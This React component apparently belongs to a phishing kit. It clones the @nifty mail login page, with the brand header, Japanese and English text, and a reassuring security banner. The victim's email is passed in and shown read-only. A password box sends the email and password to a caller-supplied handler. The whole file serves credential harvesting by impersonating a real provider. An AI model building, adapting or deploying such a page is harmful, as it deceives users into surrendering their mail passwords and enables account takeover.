'use client'

import { useState } from 'react'
import { Template, SupportedLanguage, TemplateContent } from '@/lib/templateTypes'
import { getTemplateContent } from '@/lib/templateEngine'

interface NIFTYTemplateProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

export function NIFTYTemplate({
  template,
  language: propLanguage,
  email,
  onSubmit,
  onError
}: NIFTYTemplateProps) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [stayLoggedIn, setStayLoggedIn] = useState(true)
  
  // Default to Japanese if not specified
  const language = propLanguage || 'ja'
  
  const content: TemplateContent = getTemplateContent(template, language)
  const { theme, features } = template
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!password) {
      setError(content.errorMessages.invalidPassword)
      return
    }
    
    setIsSubmitting(true)
    setError('')
    
    try {
      await onSubmit(email, password)
    } catch (err) {
      setError(content.errorMessages.serverError)
      onError?.(content.errorMessages.serverError)
    } finally {
      setIsSubmitting(false)
    }
  }
  
  return (
    <div 
      style={{
        minHeight: '100vh',
        background: '#F0F0F0',
        display: 'flex',
        flexDirection: 'column',
      }}
    >
      {/* Header Bar */}
      <header style={{
        background: 'white',
        borderBottom: '1px solid #E0E0E0',
        padding: '16px 0',
        boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
      }}>
        <div style={{
          maxWidth: '1200px',
          margin: '0 auto',
          padding: '0 24px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
        }}>
          <h1 style={{ 
            color: '#333', 
            fontSize: '20px',
            fontWeight: 'normal',
            margin: 0,
            fontFamily: 'Arial, sans-serif',
            letterSpacing: '0.5px',
          }}>
            @nifty メール
          </h1>
          
          <div style={{
            display: 'flex',
            gap: '20px',
            alignItems: 'center',
          }}>
            <a href="#" style={{ 
              fontSize: '13px', 
              color: '#666',
              textDecoration: 'none',
            }}>
              {language === 'ja' ? 'ヘルプ' : 'Help'}
            </a>
            <a href="#" style={{ 
              fontSize: '13px', 
              color: '#666',
              textDecoration: 'none',
            }}>
              {language === 'ja' ? 'お問い合わせ' : 'Contact'}
            </a>
          </div>
        </div>
      </header>
      
      {/* Main Content */}
      <div style={{
        flex: 1,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '40px 20px',
      }}>
        <div style={{
          display: 'flex',
          gap: '30px',
          maxWidth: '900px',
          width: '100%',
          alignItems: 'flex-start',
        }}>
          {/* Main Login Container */}
          <div style={{
            flex: 1,
            maxWidth: '480px',
          }}>
            <div style={{
              background: 'white',
              border: '1px solid #DDD',
              borderRadius: '4px',
              overflow: 'hidden',
              boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
            }}>
              {/* Title */}
              <div style={{
                padding: '30px 40px 20px',
                textAlign: 'center',
              }}>
                <h2 style={{
                  fontSize: '24px',
                  fontWeight: 'normal',
                  color: '#333',
                  margin: 0,
                  fontFamily: 'Arial, sans-serif',
                }}>
                  {language === 'ja' ? 'ログイン' : 'Log in'}
                </h2>
              </div>
              
              {/* Form Section */}
              <div style={{ padding: '0 40px 40px' }}>
                <form onSubmit={handleSubmit}>
                  {/* Email/@nifty ID Input */}
                  <div style={{ marginBottom: '20px' }}>
                    <div style={{ position: 'relative' }}>
                      <span style={{
                        position: 'absolute',
                        left: '14px',
                        top: '50%',
                        transform: 'translateY(-50%)',
                        color: '#999',
                        fontSize: '18px',
                      }}>
                        👤
                      </span>
                      <input
                        type="text"
                        value={email}
                        readOnly
                        placeholder={language === 'ja' 
                          ? '@nifty ID または @niftyユーザー名' 
                          : '@nifty ID or @nifty username'}
                        style={{
                          width: '100%',
                          padding: '14px 14px 14px 45px',
                          border: '1px solid #CCC',
                          borderRadius: '4px',
                          fontSize: '15px',
                          background: '#FFF',
                          color: '#333',
                          fontWeight: '500',
                          boxSizing: 'border-box',
                        }}
                      />
                    </div>
                  </div>
                  
                  {/* Password Input */}
                  <div style={{ marginBottom: '20px' }}>
                    <input
                      type="text"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder={language === 'ja' ? 'パスワード' : 'Password'}
                      disabled={isSubmitting}
                      style={{
                        width: '100%',
                        padding: '14px',
                        border: '1px solid #CCC',
                        borderRadius: '4px',
                        fontSize: '15px',
                        color: '#333',
                        fontWeight: '500',
                        boxSizing: 'border-box',
                      }}
                    />
                  </div>
                  
                  {/* Stay Logged In Checkbox */}
                  <div style={{ marginBottom: '25px' }}>
                    <label style={{ 
                      display: 'flex', 
                      alignItems: 'flex-start',
                      fontSize: '13px',
                      color: '#666',
                      cursor: 'pointer',
                      gap: '8px',
                    }}>
                      <input 
                        type="checkbox" 
                        checked={stayLoggedIn}
                        onChange={(e) => setStayLoggedIn(e.target.checked)}
                        style={{ 
                          marginTop: '2px',
                          width: '16px',
                          height: '16px',
                          accentColor: '#4169E1',
                        }}
                      />
                      <span>
                        {language === 'ja' 
                          ? 'ログインしたままにする （共用のパソコンではチェックをはずしてください）'
                          : 'Stay logged in (uncheck if on a shared computer).'}
                      </span>
                    </label>
                  </div>
                  
                  {/* Error Message */}
                  {error && (
                    <div style={{
                      background: '#FFF3CD',
                      color: '#856404',
                      padding: '12px',
                      borderRadius: '4px',
                      marginBottom: '20px',
                      fontSize: '13px',
                      border: '1px solid #FFEEBA',
                    }}>
                      {error}
                    </div>
                  )}
                  
                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      width: '100%',
                      padding: '16px',
                      background: 'linear-gradient(180deg, #FFD700 0%, #FFC107 100%)',
                      color: '#333',
                      border: 'none',
                      borderRadius: '30px',
                      fontSize: '16px',
                      fontWeight: 'bold',
                      cursor: isSubmitting ? 'not-allowed' : 'pointer',
                      opacity: isSubmitting ? 0.6 : 1,
                      transition: 'all 0.2s',
                      boxShadow: '0 3px 10px rgba(255, 193, 7, 0.3)',
                    }}
                  >
                    {isSubmitting 
                      ? (language === 'ja' ? '処理中...' : 'Processing...') 
                      : (language === 'ja' ? 'パスワード入力へ' : 'Enter your password')}
                  </button>
                  
                  {/* Forgot ID/Username Link */}
                  <div style={{ 
                    marginTop: '20px',
                    textAlign: 'center',
                  }}>
                    <a 
                      href="#" 
                      style={{ 
                        color: '#666',
                        textDecoration: 'underline',
                        fontSize: '13px',
                      }}
                    >
                      ≫ {language === 'ja' 
                        ? '@nifty ID または @niftyユーザー名がわからない場合'
                        : 'If you don\'t know your @nifty ID or @nifty username'}
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
          
          {/* Right Side - Other Services */}
          <div style={{
            width: '280px',
            paddingTop: '80px',
          }}>
            <div style={{
              textAlign: 'center',
              marginBottom: '20px',
            }}>
              <h3 style={{
                fontSize: '14px',
                fontWeight: 'normal',
                color: '#333',
                margin: '0 0 15px 0',
              }}>
                {language === 'ja' 
                  ? '@niftyメールの他サービスはこちら'
                  : 'Other @nifty mail services are available here'}
              </h3>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '8px',
              }}>
                <a 
                  href="#" 
                  style={{ 
                    color: '#C41E3A',
                    textDecoration: 'underline',
                    fontSize: '14px',
                  }}
                >
                  {language === 'ja' ? 'セカンドメール' : 'Second email'}
                </a>
                <a 
                  href="#" 
                  style={{ 
                    color: '#C41E3A',
                    textDecoration: 'underline',
                    fontSize: '14px',
                  }}
                >
                  {language === 'ja' ? 'セカンドメールPRO' : 'Second Mail PRO'}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Footer - Security Banner */}
      <footer style={{
        background: '#FFF9E6',
        borderTop: '1px solid #E0E0E0',
        padding: '30px 20px',
        marginTop: 'auto',
      }}>
        <div style={{
          maxWidth: '900px',
          margin: '0 auto',
          display: 'flex',
          alignItems: 'center',
          gap: '20px',
        }}>
          <div style={{
            width: '70px',
            height: '70px',
            background: 'linear-gradient(135deg, #FF9800 0%, #F57C00 100%)',
            borderRadius: '8px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '35px',
            flexShrink: 0,
          }}>
            🛡️
          </div>
          <div>
            <h4 style={{
              fontSize: '15px',
              fontWeight: 'bold',
              color: '#333',
              margin: '0 0 5px 0',
            }}>
              {language === 'ja' 
                ? 'メールやブログをご利用になる方'
                : 'For those using email or blogs'}
            </h4>
            <p style={{
              fontSize: '13px',
              color: '#666',
              margin: 0,
              lineHeight: '1.5',
            }}>
              {language === 'ja'
                ? '安全・安心のセキュリティ対策をご用意しています'
                : 'We provide safe and secure security measures'}
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
